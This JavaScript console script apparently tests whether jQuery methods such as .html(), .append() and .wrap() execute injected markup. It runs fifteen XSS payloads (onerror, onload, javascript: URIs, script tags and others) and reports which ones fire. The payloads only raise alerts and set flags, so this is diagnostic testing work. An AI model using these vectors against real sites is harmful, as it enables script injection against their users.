(function() {
  console.log('%c | JQuery XSS Suite | Delta | https://github.com/h1-delta-CY-IT', 'font-size: 16px; font-weight: bold; color: #FF5722;');
  console.log('%cStarting...', 'color: #666;');
  console.log('');
  
  const results = {
    vulnerable: [],
    safe: [],
    totalTests: 0,
    details: []
  };
  
  // Unique markers for each test to detect which payloads actually execute
  let testCounter = 0;
  
  // Multiple test payloads covering different XSS vectors
  const testPayloads = [
    {
      name: 'IMG onerror',
      payload: () => {
        const id = `xss_img_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<img src=x onerror="window.${id}=true; alert('XSS - Delta: IMG onerror'); console.log('[!] XSS-IMG executed')">`,
          id: id
        };
      }
    },
    {
      name: 'Script tag',
      payload: () => {
        const id = `xss_script_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<script>window.${id}=true; alert('XSS - Delta: Script tag'); console.log('[!} XSS-SCRIPT executed');</script>`,
          id: id
        };
      }
    },
    {
      name: 'SVG onload',
      payload: () => {
        const id = `xss_svg_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<svg onload="window.${id}=true; alert('XSS - Delta: SVG onload'); console.log('[!} XSS-SVG executed')"></svg>`,
          id: id
        };
      }
    },
    {
      name: 'Iframe src javascript',
      payload: () => {
        const id = `xss_iframe_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<iframe src="javascript:window.${id}=true; alert('XSS - Delta: Iframe javascript'); console.log('[!] XSS-IFRAME executed')"></iframe>`,
          id: id
        };
      }
    },
    {
      name: 'Object data',
      payload: () => {
        const id = `xss_object_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<object data="javascript:window.${id}=true; alert('XSS - Delta: Object data'); console.log('[!] XSS-OBJECT executed')"></object>`,
          id: id
        };
      }
    },
    {
      name: 'Body onload',
      payload: () => {
        const id = `xss_body_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<body onload="window.${id}=true; alert('XSS - Delta: Body onload'); console.log('[!] XSS-BODY executed')"></body>`,
          id: id
        };
      }
    },
    {
      name: 'Input onfocus autofocus',
      payload: () => {
        const id = `xss_input_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<input onfocus="window.${id}=true; alert('XSS - Delta: Input onfocus'); console.log('[!] XSS-INPUT executed')" autofocus>`,
          id: id
        };
      }
    },
    {
      name: 'Details ontoggle',
      payload: () => {
        const id = `xss_details_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<details open ontoggle="window.${id}=true; alert('XSS - Delta: Details ontoggle'); console.log('[!] XSS-DETAILS executed')"></details>`,
          id: id
        };
      }
    },
    {
      name: 'A href javascript',
      payload: () => {
        const id = `xss_ahref_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<a href="javascript:window.${id}=true; alert('XSS - Delta: A href javascript'); console.log('[!] XSS-AHREF executed')">click</a>`,
          id: id
        };
      }
    },
    {
      name: 'Form action javascript',
      payload: () => {
        const id = `xss_form_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<form action="javascript:window.${id}=true; alert('XSS - Delta: Form action'); console.log('[!] XSS-FORM executed')"><input type="submit"></form>`,
          id: id
        };
      }
    },
    {
      name: 'Video onerror',
      payload: () => {
        const id = `xss_video_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<video src=x onerror="window.${id}=true; alert('XSS - Delta: Video onerror'); console.log('[!] XSS-VIDEO executed')"></video>`,
          id: id
        };
      }
    },
    {
      name: 'Audio onerror',
      payload: () => {
        const id = `xss_audio_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<audio src=x onerror="window.${id}=true; alert('XSS - Delta: Audio onerror'); console.log('[!] XSS-AUDIO executed')"></audio>`,
          id: id
        };
      }
    },
    {
      name: 'Style with expression (IE)',
      payload: () => {
        const id = `xss_style_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<style>*{xss:expression(window.${id}=true; alert('XSS - Delta: Style expression'))}</style>`,
          id: id
        };
      }
    },
    {
      name: 'Meta refresh',
      payload: () => {
        const id = `xss_meta_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<meta http-equiv="refresh" content="0;javascript:window.${id}=true; alert('XSS - Delta: Meta refresh'); console.log('[!] XSS-META executed')">`,
          id: id
        };
      }
    },
    {
      name: 'Link href javascript',
      payload: () => {
        const id = `xss_link_${testCounter++}`;
        window[id] = false;
        return { 
          html: `<link rel="stylesheet" href="javascript:window.${id}=true; alert('XSS - Delta: Link href'); console.log('[!] XSS-LINK executed')">`,
          id: id
        };
      }
    }
  ];
  
  // Test jQuery methods
  const jQueryMethods = [
    { name: '.html()', method: 'html' },
    { name: '.append()', method: 'append' },
    { name: '.prepend()', method: 'prepend' },
    { name: '.after()', method: 'after' },
    { name: '.before()', method: 'before' },
    { name: '.replaceWith()', method: 'replaceWith' },
    { name: '.wrap()', method: 'wrap' }
  ];
  
  // Test execution function with promise support
  function runTest(jqMethod, test) {
    return new Promise((resolve) => {
      results.totalTests++;
      const payload = test.payload();
      const testId = payload.id;
      
      try {
        // Create temporary container
        const container = $('<div></div>')
          .attr('id', `xss-test-${testId}`)
          .css({
            position: 'absolute',
            top: '-9999px',
            left: '-9999px',
            width: '1px',
            height: '1px',
            overflow: 'hidden',
            visibility: 'hidden',
            pointerEvents: 'none'
          })
          .appendTo('body');
        
        // Execute the jQuery method with payload
        if (jqMethod.method === 'replaceWith') {
          const dummy = $('<span></span>').appendTo(container);
          dummy[jqMethod.method](payload.html);
        } else if (jqMethod.method === 'wrap') {
          $('<div></div>').appendTo(container)[jqMethod.method](payload.html);
        } else {
          container[jqMethod.method](payload.html);
        }
        
        // Wait for potential async execution (longer delay for better detection)
        setTimeout(() => {
          const wasTriggered = window[testId] === true;
          
          const result = {
            method: jqMethod.name,
            payload: test.name,
            vulnerable: wasTriggered
          };
          
          if (wasTriggered) {
            console.log(`  %c✗ VULNERABLE: ${test.name}`, 'color: #F44336; font-weight: bold;');
            results.vulnerable.push(`${jqMethod.name} with ${test.name}`);
          } else {
            console.log(`  %c✓ Safe: ${test.name}`, 'color: #4CAF50;');
            results.safe.push(`${jqMethod.name} with ${test.name}`);
          }
          
          results.details.push(result);
          
          // Clean up
          container.remove();
          delete window[testId];
          
          resolve();
        }, 150);
        
      } catch (e) {
        console.log(`  %c⚠ Error: ${test.name} - ${e.message}`, 'color: #FF9800;');
        results.safe.push(`${jqMethod.name} with ${test.name} (error)`);
        results.details.push({
          method: jqMethod.name,
          payload: test.name,
          vulnerable: false,
          error: e.message
        });
        resolve();
      }
    });
  }
  
  // Run all tests sequentially
  async function runAllTests() {
    for (const jqMethod of jQueryMethods) {
      console.log(`%cTesting: ${jqMethod.name}`, 'font-weight: bold; color: #2196F3; font-size: 14px;');
      
      for (const test of testPayloads) {
        await runTest(jqMethod, test);
      }
      
      console.log('');
    }
    
    displayResults();
  }
  
  // Display comprehensive results
  function displayResults() {
    console.log('%c═══════════════════════════════════════', 'color: #9E9E9E;');
    console.log('%c Test Results Summary', 'font-size: 16px; font-weight: bold; color: #FF5722;');
    console.log('%c═══════════════════════════════════════', 'color: #9E9E9E;');
    console.log(`%cTotal Tests: ${results.totalTests}`, 'font-weight: bold;');
    console.log(`%cVulnerable: ${results.vulnerable.length}`, 'color: #F44336; font-weight: bold;');
    console.log(`%cSafe: ${results.safe.length}`, 'color: #4CAF50; font-weight: bold;');
    
    const vulnRate = ((results.vulnerable.length / results.totalTests) * 100).toFixed(1);
    console.log(`%cVulnerability Rate: ${vulnRate}%`, vulnRate > 0 ? 'color: #F44336; font-weight: bold;' : 'color: #4CAF50; font-weight: bold;');
    console.log('');
    
    if (results.vulnerable.length > 0) {
      console.log('%c | VULNERABLE COMBINATIONS: |', 'color: #F44336; font-weight: bold; font-size: 14px;');
      
      // Group by method
      const byMethod = {};
      results.details.filter(r => r.vulnerable).forEach(r => {
        if (!byMethod[r.method]) byMethod[r.method] = [];
        byMethod[r.method].push(r.payload);
      });
      
      Object.keys(byMethod).forEach(method => {
        console.log(`%c  ${method}`, 'color: #F44336; font-weight: bold;');
        byMethod[method].forEach(payload => {
          console.log(`    • ${payload}`);
        });
      });
      
      console.log('');
      console.log('%c| XSS vulnerabilities detected! |', 'color: #F44336; font-weight: bold; font-size: 14px; background: #FFEBEE; padding: 4px;');
    } else {
      console.log('%c| No XSS vulnerabilities detected |', 'color: #4CAF50; font-weight: bold; font-size: 14px;');
    }
    
    console.log('');
    console.log('%c| Test Matrix: |', 'font-weight: bold;');
    console.table(results.details);
    
    console.log('');
  }
  
  // Start tests
  runAllTests();
  
})();
